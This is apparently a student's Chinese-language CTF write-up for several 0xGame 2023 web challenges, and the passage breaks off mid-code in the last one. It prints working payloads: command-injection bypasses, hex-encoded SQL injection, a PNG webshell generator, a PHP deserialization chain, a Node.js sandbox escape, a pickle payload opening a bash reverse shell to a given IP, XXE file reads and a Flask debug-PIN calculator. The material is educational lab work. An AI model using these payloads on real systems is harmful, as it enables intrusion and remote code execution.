2023/image-20231022161204842.png) 如上图，我们看一下题目名称就可以猜到应该是信息泄露，此时dirsearch扫一下看看 ![image-20231022161318450](0xGame 2023/image-20231022161318450.png) 如图发现很多关于git泄露的东西，这里直接上工具去利用漏洞： 使用githack等工具下载站点存储库的整个代码历史记录和配置信息。 GitHub - lijiejie/GitHack: A .git folder disclosure exploit 下载地址如上，注意是python2环境，具体用法参考： Git泄露总结 用法如下：在工具所在目录打开cmd python2 GitHack.py http://120.27.148.152:50013/.git/ ![image-20231022162258605](0xGame 2023/image-20231022162258605.png) ![image-20231022163523977](0xGame 2023/image-20231022163523977.png) 随后进入目标url所在目录 ![image-20231022163541284](0xGame 2023/image-20231022163541284.png) 首先查看一下git日志，可以看到哪一个人在哪个时间提交了那一个文件，每一个commit都会生成一个哈希值，这个值是唯一的，相当于commit的身份证 这里可以看到在 第二次提交的时候看到其提交了flag，那我们查看一下 ![image-20231022163710703](0xGame 2023/image-20231022163710703.png) git reflog：可以查看近期所有的提交记录，这样就可以回滚到任意一个版本 接下来查看flag所在的8a5b670：git show 8a5b670 ![image-20231022163941388](0xGame 2023/image-20231022163941388.png) 可以进一步查看提交的文件内容，找到flag [Week 1] ping ![image-20231022164257042](0xGame 2023/image-20231022164257042.png) 打开是一个ping命令执行页面，我们先查看一下源码看看有什么信息 ![image-20231022164321959](0xGame 2023/image-20231022164321959.png) 果然这里提示我们访问一下api.php &lt;?php function sanitize($s) { $s = str_replace(';', '', $s); $s = str_replace(' ', '', $s); $s = str_replace('/', '', $s); $s = str_replace('flag', '', $s); return $s; } if (isset($_GET['source'])) { highlight_file(__FILE__); die(); } if (!isset($_POST['ip'])) { die('No IP Address'); } $ip = $_POST['ip']; $ip = sanitize($ip); if (!preg_match('/((\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])\\.){3}(\\d{1,2}|1\\d\\d|2[0-4]\\d|25[0-5])/', $ip)) { die('Invalid IP Address'); } system('ping -c 4 '.$ip. ' 2&gt;&amp;1'); ?&gt; 结果发现这里是前面ping页面的源码，这里可以看到过滤了分号，空格，斜杠以及flag关键词，不过这里对我们传入的ip执行了正则的过滤，这里过滤的很全，似乎是只允许数字的，这里我们尝试换行绕过 先搞一个对上述正则的解释： 整个正则表达式用于匹配IPv4地址的所有四个部分，确保每个部分的值在0到255之间，且用点号分隔。这是一个有效的IPv4地址验证正则表达式。 payload： ip=127.0.0.1%0als ![image-20231022165222349](0xGame 2023/image-20231022165222349.png) 如上图看到成功执行，那现在就是考虑如果绕过过滤读取到flag了，这里肯定就要用到编码之类的 空格过滤的话我们可以用&lt;&gt;或者${IFS}等等，至于分号的过滤（大概率是避免我们的变量拼接吧）这里网站文章翻翻发现base64编码就可以绕过 echo \"bHMgLw==\"|base64 -d|bash ==&gt;ls / echo \"Y2F0IC9mbGFn\"|base64 -d|bash ==&gt;cat /flag 注意上述的payload之前的空格符用${IFS}代替即可绕过 ![image-20231022165608398](0xGame 2023/image-20231022165608398.png) ![image-20231022165735258](0xGame 2023/image-20231022165735258.png) 拿到flag [Week 2] ez_sqli ![image-20231022170307981](0xGame 2023/image-20231022170307981.png) 随后在下载题目给的附件，是一串python源码 from flask import Flask, render_template, request import MySQLdb import re blacklist = ['select', 'update', 'insert', 'delete', 'database', 'table', 'column', 'alter', 'create', 'drop', 'and', 'or', 'xor', 'if', 'else', 'then', 'where'] conn = MySQLdb.connect(host='db', port=3306, user='root', passwd='root', db='ctf') app = Flask(__name__) @app.route('/') def index(): field = request.args.get('order', 'id') field = re.sub(r'\\s+', '', field) for s in blacklist: if s.lower() in field.lower(): return s + ' are banned' if not re.match(r\"id|name|email\", field): field = 'id' with conn.cursor() as cursor: cursor.execute('SELECT * FROM userinfo order by %s' % field) res = cursor.fetchall() return render_template('index.html', res=res) if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=True) 这里呢设置了黑名单过滤了很多敏感词，之后如果访问/路由的话，或自动执行index函数 随后检查get参数的order和id，遍历黑名单数组查看是否存在敏感字词。接着查看传入的field是否是id，name，email中的一个，如果不是则默认配置为id，之后执行 sql语句根据field内容查找回显内容 这里分析完之后我依旧没什么思路，太菜了，这里也是看了hint发现可以堆叠注入，他说是敏感函数cursor.execute可以 执行多条sql语句，事后诸葛亮的我悟了，看来日后分析代码时，也要搜寻相关函数的用法来找漏洞。 既然提示我们是堆叠注入，且其中黑名单过滤的很多以及sub去掉了空白字符（也就是过滤空格），因此这里我又没思路了，只能看wp了，发现其利用的是mysql预处理知识，但我还没仔细学过，因此这里我直接大概了解一下上个payload，之后认真学习一番（最近事情好多，真累啊~~） wp讲的： 考察 MySQL 堆叠注⼊ + 预处理语句绕过 WAF ⿊名单过滤了常⻅的 SQL 关键词, 正常没办法进⾏ SQL 注⼊, sqlmap 也跑不出来 ⾸先得知道 mysqlclient (MySQLdb) 的 cursor.execute() ⽀持执⾏多条 SQL 语句, 这个也给了 hint 然后, MySQL ⽀持 SQL 语句的预处理 (set prepare execute), 这个⽹上搜搜也能找到对应的⽂章和 payload 预处理语句如下： prepare stmt from 'SELECT * FROM users WHERE id=?'; set @id=1; execute stmt using @id; 这里我们用报错注入去搞，但报错注入回显内容有限， # step 1 select updatexml(1,concat(0x7e,(select substr((select flag from flag),1,31)),0x7e),1); # step 2 select updatexml(1,concat(0x7e,(select substr((select flag from flag),31,99)),0x7e),1); 这里由于黑名单的存在，因此wp将其进行了ASCII码16进制编码绕过： # step 1 id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65 637420737562737472282873656c65637420666c61672066726f6d20666c6167292c312c333129292c30783 765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt; # step 2 id;set/**/@a=0x73656c65637420757064617465786d6c28312c636f6e63617428307837652c2873656c65 637420737562737472282873656c65637420666c61672066726f6d20666c6167292c33312c393929292c307 83765292c31293b;prepare/**/stmt/**/from/**/@a;execute/**/stmt; emmm大概原理是set一条待执行语句，随后将其置入prepare预处理中，接着execute执行（也没仔细学，说错了别打┭┮﹏┭┮） ![image-20231022174720144](0xGame 2023/image-20231022174720144.png) ![image-20231022174737683](0xGame 2023/image-20231022174737683.png) 找到flag [Week 2] ez_upload ![image-20231022221053241](0xGame 2023/image-20231022221053241.png) 打开题目是一个文件上传题，我们下载附件可以看到对应源码，那直接分析一波 index.php &lt;?php session_start(); $user_dir = md5($_SERVER['REMOTE_ADDR']); if (!file_exists('uploads/'.$user_dir)) { mkdir('uploads/'.$user_dir); } ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;Gravatar&lt;/title&gt; &lt;script src=\"https://cdn.bootcdn.net/ajax/libs/jquery/3.6.4/jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/js/bootstrap.min.js\"&gt;&lt;/script&gt; &lt;link href=\"https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=\"container pt-5 p-5 my-5 border\"&gt; &lt;h1&gt;Gravatar&lt;/h1&gt; &lt;p&gt;Upload you personal avatar!&lt;/p&gt; &lt;p&gt;Your upload path: &lt;code&gt;&lt;?='uploads/'.$user_dir.'/'?&gt;&lt;/code&gt;&lt;/p&gt; &lt;?php if (isset($_SESSION['avatar']) &amp;&amp; file_exists($_SESSION['avatar'])) { ?&gt; &lt;p&gt;&lt;img src=\"&lt;?=$_SESSION['avatar']?&gt;\" class=\"rounded\" width=\"200\" height=\"200\"&gt;&lt;/p&gt; &lt;?php } else { ?&gt; &lt;p&gt;You have not uploaded your avatar yet!&lt;/p&gt; &lt;?php } ?&gt; &lt;div class=\"alert alert-info\" id=\"msg\" style=\"display:none\"&gt;&lt;/div&gt; &lt;form onsubmit=\"upload(); return false;\"&gt; &lt;div class=\"row\"&gt; &lt;div class=\"col\"&gt; &lt;input type=\"file\" name=\"file\" class=\"form-control\" /&gt; &lt;/div&gt; &lt;div class=\"col\"&gt; &lt;input type=\"submit\" value=\"Upload\" class=\"btn btn-primary\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;script&gt; function upload() { $.ajax({ url: 'upload.php', type: 'POST', cache: false, data: new FormData($('form')[0]), processData: false, contentType: false, success: function (data) { $('#msg').text(data).show(); } }); } &lt;/script&gt; &lt;/html&gt; upload.php &lt;?php error_reporting(0); session_start(); //这里存储着一个文件上传目录地址 $user_dir = 'uploads/'.md5($_SERVER['REMOTE_ADDR']).'/'; //如果目录不存在则mkdir创建文件目录 if (!file_exists($user_dir)) { mkdir($user_dir); } //检查文件上传类型，对应的由相应函数创建一个新图像 switch ($_FILES['file']['type']) { case \"image/gif\": $source = imagecreatefromgif($_FILES['file']['tmp_name']); break; case \"image/jpeg\": $source = imagecreatefromjpeg($_FILES['file']['tmp_name']); break; case \"image/png\": $source = imagecreatefrompng($_FILES['file']['tmp_name']); break; default: die('Invalid file type!'); } //获取上传文件的拓展名，接着在搞一个新文件路径，由原文件的md5值和拓展名构成 $ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION); $filepath = $user_dir.md5($_FILES['file']['name']).'.'.$ext; //接着在以filepath为文件名创建一个新图像--这里就可以感觉出是二次渲染了 switch ($_FILES['file']['type']) { case \"image/gif\": imagegif($source, $filepath); break; case \"image/jpeg\": imagejpeg($source, $filepath); break; case \"image/png\": imagepng($source, $filepath); break; default: die('Invalid file type!'); } echo 'Upload avatar success! Path: '.$filepath; $_SESSION['avatar'] = $filepath; ?&gt; 这里当初分析代码的时候也没发现竟然是一道二次渲染题。。。果然还是太菜了，代码审计功底也垃圾 这里对二次渲染用的不多，因此只得啃wp了： 题⽬的功能其实是个简单的 \"⼆次渲染\", ⼆次渲染就是指服务端对⽤户上传的图⽚进⾏了⼆次处理, 例如图⽚的裁 切, 添加⽔印等等 如果只是在图⽚的末尾简单的添加了 PHP 代码并上传, 那么经过⼆次渲染之后的图⽚是不会包含这段代码的, 因此 需要去找⼀些绕过 GD 库⼆次渲染的脚本, 然后再构造图⽚⻢ 看了几篇文章感觉二次渲染就是一个在你上传一个图片之后，服务器会去提取一个图片基本组成要素（也就是你上传的）之后在次组合成一个新图像去自己新建一个图片名字去上传保存–这里解释的也有点垃圾，后续写完wp将其中的知识点好好学学。 这里先复现一波png图片的上传吧，原理不细说了，参考文章如下： https://xz.aliyun.com/t/2657#toc-12 这里有两种方法，这里我也就直接尝试其中一个简单的了（因为懒┭┮﹏┭┮ 直接上国外大牛的脚本，一键生成png-他这里是向png写入idat数据块 &lt;?php $p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23, 0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae, 0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc, 0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f, 0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c, 0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d, 0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1, 0x66, 0x44, 0x50, 0x33); $img = imagecreatetruecolor(32, 32); for ($y = 0; $y &lt; sizeof($p); $y += 3) { $r = $p[$y]; $g = $p[$y+1]; $b = $p[$y+2]; $color = imagecolorallocate($img, $r, $g, $b); imagesetpixel($img, round($y / 3), 0, $color); } imagepng($img,'./1.png'); ?&gt; 之后我们可以在php环境下运行上述代码，或者直接phpstorm运行也可，将生成的png直接上传，不过这里代码并没有限制php后缀的文件，我们在页面上传后直接bp修改后缀为php即可 ![image-20231023173148935](0xGame 2023/image-20231023173148935.png) 如图将png改为php上传，之后访问链接执行恶意代码即可 ![image-20231023173221731](0xGame 2023/image-20231023173221731.png) 拿到flag [Week 2] ez_unserialize &lt;?php show_source(__FILE__); class Cache { public $key; public $value; public $expired; public $helper; public function __construct($key, $value, $helper) { $this-&gt;key = $key; $this-&gt;value = $value; $this-&gt;helper = $helper; $this-&gt;expired = False; } public function __wakeup() { $this-&gt;expired = False; } public function expired() { if ($this-&gt;expired) { $this-&gt;helper-&gt;clean($this-&gt;key); return True; } else { return False; } } } class Storage { public $store; public function __construct() { $this-&gt;store = array(); } public function __set($name, $value) { if (!$this-&gt;store) { $this-&gt;store = array(); } if (!$value-&gt;expired()) { $this-&gt;store[$name] = $value; } } public function __get($name) { return $this-&gt;data[$name]; } } class Helper { public $funcs; public function __construct($funcs) { $this-&gt;funcs = $funcs; } public function __call($name, $args) { $this-&gt;funcs[$name](...$args); } } class DataObject { public $storage; public $data; public function __destruct() { foreach ($this-&gt;data as $key =&gt; $value) { $this-&gt;storage-&gt;$key = $value; } } } if (isset($_GET['u'])) { unserialize($_GET['u']); } ?&gt; 依旧是浏览敏感函数，这里可以发现$this-&gt;funcs[$name](...$args);就是我们最终要利用的地方，那我们思考如何调用call魔术方法： __call()，在对象中调用一个不可访问方法时调用 依据上述我们可以找到$this-&gt;helper-&gt;clean($this-&gt;key);敏感语句，倘若我们将helper赋值为Helper对象，而其中也没有clean方法，那我们便成功调用，接下来在判断如何调用其所在的expired方法，我们接着浏览可以看到 if (!$value-&gt;expired()) { $this-&gt;store[$name] = $value; } 这意味着如果我们将value变量赋值为Cache对象，我们便可以成功调用，那接下来在判断如何调用其所在的set魔术方法： __set()，在给不可访问属性赋值时调用 依据上述我们可以找到 foreach ($this-&gt;data as $key =&gt; $value) { $this-&gt;storage-&gt;$key = $value; } 这意味着如果我们将storage赋值为Storage对象时，接着将key变量赋值为对象中没有的属性，那我们便可以成功调用。综上所述我们pop链如下： DataObject.__destruct() -&gt; Storage.__set() -&gt; Cache.expired() -&gt; Helper.__call() 接下来就是变量赋值问题了，这里我也是有点手足无措，只好借助wp了。。。payload如下： &lt;?php class Cache { public $key; public $value; public $expired; public $helper; } class Storage { public $store; } class Helper { public $funcs; } class DataObject { public $storage; public $data; } $cache1 = new Cache(); $cache2 = new Cache(); $poc = new DataObject(); $poc-&gt;storage = new Storage(); $poc-&gt;storage-&gt;store = &amp;$cache2-&gt;expired; $cache2-&gt;key = 'php -r \"phpinfo();\"'; $poc-&gt;data = array('key1' =&gt; $cache1, 'key2' =&gt; $cache2); $cache2-&gt;helper = new Helper(); $cache2-&gt;helper-&gt;funcs = array('clean' =&gt; 'system'); echo serialize($poc); ?&gt; 这里在总结一波思路，首先new两个Cache对象，接着new一个DataObject对象，用于后续调用Storage.__set()方法，接着给其中的storage赋值为Storage对象，随后在将storage中的store属性与cache2的expired属性做一个引用。然后是将data属性赋值为含有两个元素的数组： 这里呢先看data的第一个元素也就是cache1，其在foreach循环的第一次赋值时，调用了set魔术方法，这时候其中的store属性被赋值为空数组，接着由于cache1的expired属性为false，这时候是无法成功调用clean方法的，于是store数组此时被赋值为array('key1'=&gt;$cache1)，总之此时store便不在是空了。但此时我们注意由于引用的存在，此时cache2的expired属性已经不可能为false了，紧接着在第二次foreach循环时，便可以成功调用cache2的clean方法 接着我们将helper赋值为Helper对象，由于其中不存在clean方法，于是我们成功调用了其中的call魔术方法，并且字符串clean与key被当做call的参数，此时我们又可以将其中的funcs赋值为一个数组：array('clean'=&gt;'system')。其中的key为我们想要执行的恶意代码即可，这样在上述的组合下$this-&gt;funcs[$name](...$args);变为$this-&gt;funcs['clean'](恶意代码);=&gt;system(恶意代码); O:10:\"DataObject\":2:{s:7:\"storage\";O:7:\"Storage\":1:{s:5:\"store\";N;}s:4:\"data\";a:2:{s:4:\"key1\";O:5:\"Cache\":4:{s:3:\"key\";N;s:5:\"value\";N;s:7:\"expired\";N;s:6:\"helper\";N;}s:4:\"key2\";O:5:\"Cache\":4:{s:3:\"key\";s:19:\"php -r \"phpinfo();\"\";s:5:\"value\";N;s:7:\"expired\";R:3;s:6:\"helper\";O:6:\"Helper\":1:{s:5:\"funcs\";a:1:{s:5:\"clean\";s:6:\"system\";}}}}} 输出如上，这里也是看别人wp知道flag被放在了环境变量中，这里它采用读取phpinfo的方法。但令我疑惑的是为何直接赋值为phpinfo()的话执行不了。。。 ![image-20231023191959782](0xGame 2023/image-20231023191959782.png) 拿到flag [Week 2] ez_sandbox 打开题目发现一个登录框，弱口令无果，扔给dirsearch扫目录，随后用bp抓一个登录包数据看看有何信息： ![image-20231026195758333](0xGame 2023/image-20231026195758333.png) 如上图是一个json数据块，其中包含用户名和密码，其次扫目录发现存在注册用户页面，看题目名称为沙箱，也没思路，于是看wp发现考察nodejs沙箱逃逸和原型链污染（懵逼了，这玩意儿没咋好好学，┭┮﹏┭┮）只能浑水摸鱼了，写完wp后就学！！！ 代码在注册和登录的时候使⽤了 clone(req.body) function merge(target, source) { for (let key in source) { if (key === '__proto__') { continue } if (key in source &amp;&amp; key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } return target } function clone(source) { return merge({}, source) } 根据⼀些参考⽂章, 很容易就可以知道这⾥存在原型链污染, 但是 proto 关键词被过滤了 如果你对原型链这个概念稍微做⼀点深⼊了解, 就可以知道, 对于⼀个实例对象, 它的 proto 就等于constructor.prototype这样可以绕过proto关键词的过滤 先注册⼀个 test用户, 在登录时 POST 如下内容, 污染 admins 对象, 使得 username in admins 表达式的结果为True { \"username\": \"test\", \"password\": \"test\", \"constructor\": { \"prototype\": { \"test\": \"123\" } } } ![image-20231026201904531](0xGame 2023/image-20231026201904531.png) 随后test 123登录进去发现成功得到admin用户权限 ![image-20231026201951999](0xGame 2023/image-20231026201951999.png) 然后是⼀个简单的 vm 沙箱逃逸 https://xz.aliyun.com/t/11859 代码会 catch vm 沙箱执⾏时抛出的异常, 并访问异常的 message 属性 那么结合上面的文章, 可以通过 throw 抛出对象的思路, 拿到 arguments.callee.caller (指向 当前函数的调用者), 然后拿到沙箱外的 process 对象, 最终实现 RCE waf 函数有⼀些简单的关键词过滤, 不过因为 Javascript 语言本身非常灵活, 所以可以使用中 括号 + 字符串拼接的形式绕过 https://www.anquanke.com/post/id/237032 下面两种方式都行 // method 1 throw new Proxy({}, { // Proxy 对象⽤于创建对某⼀对象的代理, 以实现属性和⽅法的拦截 get: function(){ // 访问这个对象的任意⼀个属性都会执⾏ get 指向的函数 const c = arguments.callee.caller const p = (c['constru'+'ctor']['constru'+'ctor']('return pro'+'cess'))() return p['mainM'+'odule']['requi'+'re']('child_pr'+'ocess')['ex'+'ecSync']('cat /flag').toString(); } }) // method 2 let obj = {} // 针对该对象的 message 属性定义⼀个 getter, 当访问 obj.message 时会调⽤对应的函数 obj.__defineGetter__('message', function(){ const c = arguments.callee.caller const p = (c['constru'+'ctor']['constru'+'ctor']('return pro'+'cess'))() return p['mainM'+'odule']['requi'+'re']('child_pr'+'ocess')['ex'+'ecSync']('cat /flag').toString(); }) throw obj ![image-20231026202002001](0xGame 2023/image-20231026202002001.png) 拿到flag（等我深入学习一波再回来思考 [Week 3] notebook ![image-20231026203700101](0xGame 2023/image-20231026203700101.png) 打开题目是一个笔记本 ？？？,这里测试了一番发现不是xss等漏洞，搜目录也没有信息，根据题目提示说是该项目由flask框架搭建。之后看了wp发现考察的是session伪构造，pickle反序列化，反弹shell 题目源码如下： from flask import Flask, request, render_template, session import pickle import uuid import os app = Flask(__name__) app.config['SECRET_KEY'] = os.urandom(2).hex() class Note(object): def __init__(self, name, content): self._name = name self._content = content @property def name(self): return self._name @property def content(self): return self._content @app.route('/') def index(): return render_template('index.html') @app.route('/&lt;path:note_id&gt;', methods=['GET']) def view_note(note_id): notes = session.get('notes') if not notes: return render_template('note.html', msg='You have no notes') note_raw = notes.get(note_id) if not note_raw: return render_template('note.html', msg='This note does not exist') note = pickle.loads(note_raw) return render_template('note.html', note_id=note_id, note_name=note.name, note_content=note.content) @app.route('/add_note', methods=['POST']) def add_note(): note_name = request.form.get('note_name') note_content = request.form.get('note_content') if note_name == '' or note_content == '': return render_template('index.html', status='add_failed', msg='note name or content is empty') note_id = str(uuid.uuid4()) note = Note(note_name, note_content) if not session.get('notes'): session['notes'] = {} notes = session['notes'] notes[note_id] = pickle.dumps(note) session['notes'] = notes return render_template('index.html', status='add_success', note_id=note_id) @app.route('/delete_note', methods=['POST']) def delete_note(): note_id = request.form.get('note_id') if not note_id: return render_template('index.html') notes = session.get('notes') if not notes: return render_template('index.html', status='delete_failed', msg='You have no notes') if not notes.get(note_id): return render_template('index.html', status='delete_failed', msg='This note does not exist') del notes[note_id] session['notes'] = notes return render_template('index.html', status='delete_success') if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=False) 这里由于没学过相关知识，我还是跟着wp走一遍吧，后续再去补 这里分析一遍代码会发现，存在secret key，这里就是让我们利用其去session伪造 ⾸先得知道 flask 的 session 信息存储在 cookie 中, 因此这种 session 也被称作 \"客户端 session\" ⽽ session 要想保证不被恶意修改, 就会使⽤⼀个 secret key 进⾏签名 注意 \"签名\" 不等于 \"加密\", 我们其实仍然能够看到 session 中存储的信息, 但是⽆法修改它, 这⼀点和 JWT (JSON Web Token) 类似 题目中的 secret key，这⾥留了个随机数主要是让⼤家关注随机数的长度, 如果这个长度过小, 那么很容易就能爆破出来，⼀部分人可能不知道它长度是多少, 这个其实放到 python 里面运行⼀下就知道了, 只有 4 位，然后因为是 hex, 所以只会出现 0123456789abcdef 这些字符 ![image-20231104101618909](0xGame 2023/image-20231104101618909.png) 如图所示，可以看到位数是4位，接下来先手动生成⼀个四位数字典 import itertools d = itertools.product('0123456789abcdef', repeat=4) with open('dicts.txt', 'w') as f: for i in d: s = ''.join(i) f.write(s + ' ') 利用session伪造工具：https://github.com/Paradoxis/Flask-Unsign 将上述脚本生成的txt复制到工具的目录下，随后输入如下命令 flask-unsign --unsign --cookie \".eJwti1sLgjAYQP9K7H0w5qZ8gg82MqULmJeZb9vwks0KCnwQ_3sJHThv58zo8fw0b-TPyGPMczlhmCkDmDXKYFDgYAKUM8dVwFy1dhuNfNSFWZmm4R9xEhG0WkYvbaG1ybTLRyB1neVWjFsb0-KQTFFFea-lLIaw7A299IZn6zdoykktOfl9-2t1vq_auLwduyBAy7J8ARAdMR4.ZUW4BQ.76TUC_1vDgzmCy2DVpM6xWsZQyc\" --wordlist dicts.txt --no-literal-eval 这里的cookie的获取是如下图所示的页面下的cookie ![image-20231104112534159](0xGame 2023/image-20231104112534159.png) ![image-20231104105505385](0xGame 2023/image-20231104105505385.png) 如图成功爆破，然后就是利用路由/&lt;path:note_id&gt;下的pickle反序列化，这里用的是反弹shell，payload如下（） b'''cos system (S\"bash -c 'bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1'\" tR. ''' 然后就是session伪造，注意note_id值要为对应值 flask-unsign --sign --cookie \"{'notes': {'74476504-4ac9-4eac-9a93-0925436a946a': b'''cos system (S'bash -c \\'bash -i &gt;&amp; /dev/tcp/124.220.233.26/5555 0&gt;&amp;1\\'' tR.'''}}\" --secret 143b --no-literal-eval 这里由于cookie周围被双引号包围，故我们里面的shell只能都用单引号，起冲突的我们要用\\转义 ![image-20231104110414689](0xGame 2023/image-20231104110414689.png) 如图成功加密，我们刷新页面bp抓包，替换上述cookie发送即可，同时我们的vps要开启监听（注意端口要在安全组放开） ![image-20231104112644645](0xGame 2023/image-20231104112644645.png) ![image-20231104112416629](0xGame 2023/image-20231104112416629.png) ![image-20231104112349809](0xGame 2023/image-20231104112349809.png) 成功反弹shell拿到flag [Week 3] rss_parser 这道题看不懂，先跟着wp复现完，最后学相关知识吧 from flask import Flask, render_template, request, redirect from urllib.parse import unquote from lxml import etree from io import BytesIO import requests import re app = Flask(__name__) @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'GET': return render_template('index.html') else: feed_url = request.form['url'] if not re.match(r'^(http|https)://', feed_url): return redirect('/') content = requests.get(feed_url).content tree = etree.parse(BytesIO(content), etree.XMLParser(resolve_entities=True)) result = {} rss_title = tree.find('/channel/title').text rss_link = tree.find('/channel/link').text rss_posts = tree.findall('/channel/item') result['title'] = rss_title result['link'] = rss_link result['posts'] = [] if len(rss_posts) &gt;= 10: rss_posts = rss_posts[:10] for post in rss_posts: post_title = post.find('./title').text post_link = post.find('./link').text result['posts'].append({'title': post_title, 'link': unquote(post_link)}) return render_template('index.html', feed_url=feed_url, result=result) if __name__ == '__main__': app.run(host='0.0.0.0', port=8000, debug=True) 这里题目给了源码，这里看到关键词就是xml，etree，猜测就是xxe漏洞了，翻了翻笔记： Python： from lxml import etree xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 上述代码是经典的防止解析外部xml的防御代码，与题目给的代码进行比较resolve_entities=True，我们可以很容易的发现题目是存在xxe漏洞的 将一个符合 RSS Feed XML 标准的 payload 放到 HTTP 服务器上就可以 XXE (也可以参考 https://exp10it.cn/index.xml 改一改) 这里我感觉参考：https://support.google.com/merchants/answer/160589?hl=zh-Hans也是可以改改的 但是无法直接读取 /flag 文件, 这里考察获取 Flask 在 Debug 模式下的 PIN Code 以实现 RCE https://xz.aliyun.com/t/8092 https://www.tr0y.wang/2022/05/16/SecMap-flask/ 读取 /sys/class/net/eth0/address &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM \"file:///sys/class/net/eth0/address\"&gt;]&gt; &lt;rss xmlns:atom=\"http://www.w3.org/2005/Atom\" version=\"2.0\"&gt; &lt;channel&gt; &lt;title&gt;&amp;file;&lt;/title&gt; &lt;link&gt;vps-ip&lt;/link&gt; &lt;item&gt; &lt;title&gt;test&lt;/title&gt; &lt;link&gt;vps-ip&lt;/link&gt; &lt;/item&gt; &lt;/channel&gt; &lt;/rss&gt; 至于为何是上述payload这种格式，这就得参考代码处的： rss_title = tree.find('/channel/title').text rss_link = tree.find('/channel/link').text rss_posts = tree.findall('/channel/item') 也就是说我们的xml-payload中必须含有channel/title、/channel/link、/channel/item，在看如下 post_title = post.find('./title').text post_link = post.find('./link').text 这意味着我们还要有/channel/item/title、/channel/item/link ![image-20231104182023515](0xGame 2023/image-20231104182023515.png) 如图成功读取：02:42:ac:1c:00:02 转换为十进制2485378613250 print(int('02:42:ac:1c:00:02'.replace(':',''),16)) 然后读取 machine id 或者 boot id 因为这里不存在 /etc/machine-id, 所以读取 /proc/sys/kernel/random/boot_id &lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt; &lt;!DOCTYPE test [ &lt;!ENTITY file SYSTEM \"file:///proc/sys/kernel/random/boot_id\"&gt;]&gt; &lt;rss xmlns:atom=\"http://www.w3.org/2005/Atom\" version=\"2.0\"&gt; &lt;channel&gt; &lt;title&gt;&amp;file;&lt;/title&gt; &lt;link&gt;vps-ip&lt;/link&gt; &lt;item&gt; &lt;title&gt;test&lt;/title&gt; &lt;link&gt;vps-ip&lt;/link&gt; &lt;/item&gt; &lt;/channel&gt; &lt;/rss&gt; 结果为：5dcbb593-2656-4e8e-a4e9-9a0afb803c47 然后根据上面的文章, 读取 /proc/self/cgroup 显示 0::/, 也就是没有 id 值, 所以不用拼接, 直接用上面的 boot id 就行 ![image-20231104182600936](0xGame 2023/image-20231104182600936.png) 剩下的 username 可以通过读取 /etc/passwd 来猜一下, 一般都是 root 或者最底下的用户 app, 多试几个就行 ![image-20231104182652180](0xGame 2023/image-20231104182652180.png) 最后随便填一个 url, 比如 https://exp10it.cn/xxx 就能在报错页面看到 flask 的路径 exp (注意新版本 flask 计算 pin code 时用的是 sha1, 旧版本才是 md5) import hashlib from itertools import chain probably_public_bits = [ 'app'# username 'flask.app',# modname 'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__')) '/usr/local/lib/python3.9/site-packages/flask/app.py' # getattr(mod, '__file__', None), ] private_bits = [ '2485378613250',# str(uuid.getnode()), /sys/class/net/ens33/address '5dcbb593-2656-4e8e-a4e9-9a0afb803c47'# get_machine_id(), /etc/machine-id ] h = hashlib.sha1() for bit in chain(probably_public_bits, private_bits): if not bit: continue if isinstance(bit, str): bit = bit.encode(\"utf-8\") h.update(bit) h.update(b\"cookiesalt\") cookie_name = f\"__wzd{h.hexdigest()[:20]}\" # If we need to generate a pin we salt it a bit more so that we don't # end up with the same value and generate out 9 digits num = None if num is None: h.update(b\"pinsalt\") num = f\"{int(h.hexdigest(), 16):09d}\"[:9] # Format the pincode in groups of digits for easier remembering if # we don't have a result yet. rv = None if rv is None: for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \"-\".join( num[x : x + group_size].rjust(group_size, \"0\") for x in range(0, len(num), group_size) ) break else: rv = num print(rv) ![image-20231104182908326](0xGame 2023/image-20231104182908326.png) 运行得到pin码 之后在靶机首页随便输入一个错误的ip地址，进入报错页面之后在右侧点击一个小黑框，输入pin code之后可以在左侧看到一个可以执行python代码的地方，如下图输入即可得到flag ![image-20231104183759696](0xGame 2023/image-20231104183759696.png) [Week 3] zip_file_manager from flask import Flask, request, render_template, redirect, send_file import hashlib import os app = Flask(__name__) def md5(m): return hashlib.md5(m.encode('utf-8')).hexdigest() @app.route('/unzip', methods=['POST']) def unzip(): f = request.files.get('file') if not f.filename.endswith('.zip'): return redirect('/') user_dir = os.path.join('./uploads', md5(request.remote_addr)) if not os.path.exists(user_dir): os.mkdir(user_dir) zip_path = os.path.join(user_dir, f.filename) dest_path = os.path.join(user_dir, f.filename[:-4]) f.save(zip_path) os.system('unzip -o {} -d {}'.format(zip_path, dest_path)) return redirect('/') @app.route('/', defaults={'subpath': ''}, methods=['GET']) @app.route('/&lt;path:subpath&gt;', methods=['GET']) def 